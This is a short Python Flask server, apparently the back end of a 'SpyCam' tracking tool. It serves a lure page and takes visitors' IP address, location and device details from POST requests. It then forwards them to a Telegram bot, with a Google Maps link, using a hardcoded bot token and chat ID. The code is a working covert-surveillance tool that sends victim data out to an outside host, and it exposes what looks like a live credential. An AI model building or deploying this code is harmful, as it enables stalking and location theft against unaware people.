from flask import Flask, request, render_template
import requests

app = Flask(__name__)
BOT_TOKEN = "7819456054:AAH9GmqSpOorYeaQ82zzHqct0p64VJ33fe0"
CHAT_ID = "6908281054"

@app.route('/')
def index():
    return render_template("spycam.html")

@app.route('/info', methods=['POST'])
def info():
    data = request.json
    message = f"📸 *SpyCam Alert!*\n\n🌐 IP: {data['ip']}\n📍 Location: {data['location']}\n📌 Map: https://www.google.com/maps?q={data['location']}\n\n📱 Device: {data['device']}"
    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", params={
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    })
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
